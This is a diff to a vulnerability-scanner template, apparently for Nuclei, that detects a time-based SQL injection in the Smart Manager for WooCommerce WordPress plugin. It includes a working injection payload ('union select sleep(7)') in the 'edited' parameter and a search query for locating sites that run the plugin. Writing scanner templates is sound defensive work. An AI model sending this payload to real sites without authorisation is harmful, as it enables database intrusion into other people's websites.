@@ -1,5 +1,4 @@
 id: wp-smart-manager-sqli
-
 info:
   name: Smart Manager for WooCommerce & WPeC <= 3.9.6 - SQL Injection
   author: r3Y3r53
@@ -11,14 +10,24 @@ info:
     - https://wpscan.com/vulnerability/e060fbff-792f-4fb5-baa5-82d80240ec99
     - http://cinu.pl/research/wp-plugins/mail_0666ceeca20683907bf82514e8f93e0f.html
     - https://wordpress.org/plugins/smart-manager-for-wp-e-commerce/
+  classification:
+    cwe-id:
+      - CWE-89
   metadata:
-    verified: true
     max-request: 2
-    publicwww-query: "/wp-content/plugins/smart-manager-for-wp-e-commerce/"
-  tags: time-based-sqli,wpscan,wp,wp-plugin,wordpress,smart-manager-for-wp-e-commerce,sqli,vuln
-
+    publicwww-query: /wp-content/plugins/smart-manager-for-wp-e-commerce/
+    verified: true
+  tags: smart-manager-for-wp-e-commerce,sqli,time-based-sqli,vuln,wordpress,wp,wp-plugin,wpscan
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        dsl:
+          - duration_2>=7
+          - status_code_2 == 500
+          - contains(body_1, "Smart Manager for e-Commerce")
+          - contains(body_2, "rel=\"preconnect") || contains(body, "Error</title>")
+        type: dsl
+    raw:
       - |
         GET /wp-content/plugins/smart-manager-for-wp-e-commerce/readme.txt HTTP/1.1
         Host: {{Hostname}}
@@ -29,13 +38,3 @@ http:
         Content-Type: application/x-www-form-urlencoded
 
         cmd=saveData&edited=%5B%7B%22id%22%3A%22+1%29+union+select+sleep%287%29%2C2%3B+--+%22%7D%5D
-
-    matchers:
-      - type: dsl
-        dsl:
-          - 'duration_2>=7'
-          - 'status_code_2 == 500'
-          - 'contains(body_1, "Smart Manager for e-Commerce")'
-          - 'contains(body_2, "rel=\"preconnect") || contains(body, "Error</title>")'
-        condition: and
-
